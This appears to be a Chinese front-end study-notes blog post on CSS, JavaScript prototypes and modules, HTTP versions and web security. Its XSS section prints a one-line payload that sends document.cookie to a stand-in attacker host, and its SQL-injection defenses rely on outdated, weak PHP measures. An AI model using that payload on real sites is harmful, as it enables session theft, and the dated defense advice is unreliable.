---
author: CC-2018
layout: post
title: "fe"
date: 2017-08-18 08:09:01 +0800
categories: document
tag: 总结
---

* content
{:toc}

### css盒子模型

盒子模型包括外边距（margin）、边框（border）、内边距（padding）、内容（content）四个属性。

content为image，或文字，或包含小的盒子。

CSS盒子具有弹性，会自适应。

W3C标准盒子 = (边框 + 填充 + 内容块大小)。

box-sizing:border-box  width属性为边框 + 填充 + 内容块大小

box-sizing:content-box  width属性为内容块大小

inline元素声明margin-top和margin-bottom没有效果

### CSS未知宽高元素水平垂直居中

**方法一**

思路：显示设置父元素为：table，子元素为：cell-table，这样就可以使用vertical-align: center，实现水平居中

优点：父元素（parent）可以动态的改变高度（table元素的特性）

缺点：IE8以下不支持，增加html复杂性

**方法二**

思路：子元素绝对定位，距离顶部 50%，左边50%，然后使用css3 transform:translate(-50%; -50%)

优点：高大上,可以在webkit内核的浏览器中使用

缺点：不支持IE9以下不支持transform属性

**方法三**
思路：使用css3 flex布局
优点：简单 快捷
缺点：兼容不好

### 绑定事件的方式

在DOM元素中直接绑定

在JavaScript代码中绑定 onclick=function 方式

绑定事件监听函数 用addEventListener() 或 attachEvent() 来绑定事件监听函数。

### 类、原型对象、构造函数

面向对象，js中不存在类的概念，js不是基于类，而是通过构造函数(constructor)和原型链（propotype chains）实现的

构造函数的特点：

构造函数的首字母必须大写，用来区分于普通函数

内部使用的this对象，来指向即将要生成的实例对象

使用New来生成实例对象

构造函数的缺点：

所有的实例对象都可以继承构造器函数中的属性和方法(包括构造函数里的prototype)。但是，同一个对象实例之间，无法共享属性，所以对于方法来说，如果定义在构造函数里会造成多个实例创建多个方法，浪费内存空间

解决思路：

所有实例都会通过原型链引用到prototype

prototype相当于特定类型所有实例都可以访问到的一个公共容器

那么我们就将重复的东西放到公共容易就好了


propotype属性的作用

js中每个数据类型都是对象，除了null 和 undefined（这个可以参考另一篇将null 和 undefined的博客）,而每个对象都是继承自一个原型对象，只有null除外，它没有自己的原型对象，最终的Objec的原型为null

JS中万物都是对象，但是对象也分为：普通对象和函数对象，也就是Object 和 Function.

那么怎么区分普通对象和函数对象呢？ ---凡是通过New Function()创建的对象都是函数对象，其他的都是普通对象.

需要注意的是：普通对象没有propotype（prototype即是属性也是对象），但是有__proto__属性。

**js创建对象的时候都有一个__propo__内置属性，用于指向创建它的函数对象的原型对象prototype。**


### this 指针

它代表函数运行时，自动生成的一个内部对象，只能在函数内部使用。

一个总的原则，那就是this指的是，调用函数的那个对象。

1. 全局函数调用，指向window或global

2. 对象方法调用，指向上级对象。

3. 作为构造函数调用，指向这个对象

4. apply调用 它的作用是改变函数的调用对象，它的第一个参数就表示改变后的调用这个函数的对象。因此，this指的就是这第一个参数。

5. 箭头函数this

### cmd amd es6 模块规范

**CommonJS 规范**

```
// 一下为一个完整模块定义
{
  id: '...',
  exports: { ... },
  loaded: true,
  ...
}

// math.js
exports.add = function(a, b) {
  return a + b;
}

var math = require('math');
math.add(2, 3); // 5
```

cmd规范里require是一个同步读取本地磁盘js过程，不适合浏览器的下载

**AMD 规范**

AMD是”Asynchronous Module Definition”的缩写，即”异步模块定义”。调用格式为：`require([module], callback);`

模块书写必须使用特定的define()函数来定义 `define(id?, dependencies?, factory);` AMD是依赖前置的。

**CMD 规范**

CMD推崇依赖就近，延迟执行。可以把依赖写进代码的任意一行。

```
define(function(require, exports, module) {
  var a = require('./a');
  a.doSomething();
  var b = require('./b');
  b.doSomething();
})
```
**ES6**

es6通过import、export实现模块的输入输出。其中import命令用于输入其他模块提供的功能，export命令用于规定模块的对外接口。


### http http1.x https http2.0 websocket

**http**

HTTP是建立在TCP协议之上，所以HTTP协议的瓶颈及其优化技巧都是基于TCP协议本身的特性，例如tcp建立连接的3次握手和断开连接的4次挥手以及每次建立连接带来的RTT延迟时间。

带宽：如果说我们还停留在拨号上网的阶段，带宽可能会成为一个比较严重影响请求的问题，但是现在网络基础建设已经使得带宽得到极大的提升，我们不再会担心由带宽而影响网速，那么就只剩下延迟了。

延迟：浏览器阻塞（HOL blocking）：浏览器会因为一些原因阻塞请求。浏览器对于同一个域名，同时只能有 4 个连接（这个根据浏览器内核不同可能会有所差异），超过浏览器最大连接数限制，后续请求就会被阻塞。

DNS 查询（DNS Lookup）：浏览器需要知道目标服务器的 IP 才能建立连接。将域名解析为 IP 的这个系统就是 DNS。这个通常可以利用DNS缓存结果来达到减少这个时间的目的。
 建立连接（Initial connection）：HTTP 是基于 TCP 协议的，浏览器最快也要在第三次握手时才能捎带 HTTP 请求报文，达到真正的建立连接，但是这些连接无法复用会导致每次请求都经历三次握手和慢启动。三次握手在高延迟的场景下影响较明显，慢启动则对文件类大请求影响较大。

**HTTP1.0和HTTP1.1的一些区别：**

缓存处理，在HTTP1.0中主要使用header里的If-Modified-Since,Expires来做为缓存判断的标准，HTTP1.1则引入了更多的缓存控制策略例如Entity tag，If-Unmodified-Since, If-Match, If-None-Match等更多可供选择的缓存头来控制缓存策略。

带宽优化及网络连接的使用，HTTP1.0中，存在一些浪费带宽的现象，例如客户端只是需要某个对象的一部分，而服务器却将整个对象送过来了，并且不支持断点续传功能，HTTP1.1则在请求头引入了range头域，它允许只请求资源的某个部分，即返回码是206（Partial Content），这样就方便了开发者自由的选择以便于充分利用带宽和连接。

错误通知的管理，在HTTP1.1中新增了24个错误状态响应码，如409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除。

Host头处理，在HTTP1.0中认为每台服务器都绑定一个唯一的IP地址，因此，请求消息中的URL并没有传递主机名（hostname）。但随着虚拟主机技术的发展，在一台物理服务器上可以存在多个虚拟主机（Multi-homed Web Servers），并且它们共享一个IP地址。HTTP1.1的请求消息和响应消息都应支持Host头域，且请求消息中如果没有Host头域会报告一个错误（400 Bad Request）。

长连接，HTTP 1.1支持长连接（PersistentConnection）和请求的流水线（Pipelining）处理，在一个TCP连接上可以传送多个HTTP请求和响应，减少了建立和关闭连接的消耗和延迟，在HTTP1.1中默认开启Connection： keep-alive，一定程度上弥补了HTTP1.0每次请求都要创建连接的缺点。

**https**

http = tcp + http协议
https = http + ssl

**HTTP2.0的新特性**

新的二进制格式（Binary Format），HTTP1.x的解析是基于文本。基于文本协议的格式解析存在天然缺陷，文本的表现形式有多样性，要做到健壮性考虑的场景必然很多，二进制则不同，只认0和1的组合。基于这种考虑HTTP2.0的协议解析决定采用二进制格式，实现方便且健壮。

多路复用（MultiPlexing），即连接共享，即每一个request都是是用作连接共享机制的。一个request对应一个id，这样一个连接上可以有多个request，每个连接的request可以随机的混杂在一起，接收方可以根据request的 id将request再归属到各自不同的服务端请求里面。

**websocket**

WebSocket是基于HTTP1.1的协议，可以简单理解为创建了一条TCP连接，具有双向传输二进制等特性。而HTTP2.0则是对HTML、CSS等JS资源的传输方式进行了优化，并没有提供新的JS API，也不能用于实时传输消息。


### web安全

**DoS和DDoS攻击**

伪造大量不存在的ip发送请求给服务器，服务器三步握手时收不到回应会有个长时间的半连接状态，消耗大量资源。

**CSRF攻击**

b网站利用已登录a网站的cookie，发送恶意请求道a网站

Anti-CSRF-Token防御 即发送请求时在HTTP 请求中以参数的形式加入一个随机产生的token，并在服务器建立一个拦截器来验证这个token。服务器读取浏览器当前域cookie中这个token值，会进行校验该请求当中的token和cookie当中的token值是否都存在且相等，才认为这是合法的请求

**XSS攻击**

跨站脚本攻击，XSS跨站脚本攻击本身对Web服务器没有直接的危害，它借助网站进行传播，使网站上大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意URL，当受害者在Web中打开该URL的时候，恶意脚本会在受害者的计算机上悄悄执行。

如下制造出一个链接：
```
vari=document.createElement("img");
document.body.appendChild(i);
i.src = "http://www.hackerserver.com/?c=" + document.cookie;
```
防范措施

输入过滤，在PHP中，有htmlentities()和htmlspecialchars()两个函数可以满足安全要求。相应的JavaScript的编码方式可以使用JavascriptEncode。

HttpOnly Cookie

**SQL注入攻击**

SQL注入常见的注入方式有：
(1) 内联SQL注入。向查询注入一些SQL代码后，原来的查询仍然会全部执行。内联SQL注入包含字符串内联SQL注入和数字内联SQL注入。
(2) 终止式SQL注入。攻击者在注入SQL代码时，通过注释剩下的查询来成功结束该语句。

对于SQL注入攻击，我们可以做如下防范：
(1) 防止系统敏感信息泄露。设置php.ini选项display_errors=off，防止php脚本出错之后，在web页面输出敏感信息错误，让攻击者有机可乘。
(2) 数据转义。设置php.ini选项magic_quotes_gpc=on，它会将提交的变量中所有的’(单引号)，”(双引号)，\(反斜杠)，空白字符等都在前面自动加上\。或者采用mysql_real_escape()函数或addslashes()函数进行输入参数的转义。
(3) 增加黑名单或者白名单验证。白名单验证一般指，检查用户输入是否是符合预期的类型、长度、数值范围或者其他格式标准。黑名单验证是指，若在用户输入中，包含明显的恶意内容则拒绝该条用户请求。在使用白名单验证时，一般会配合黑名单验证。 
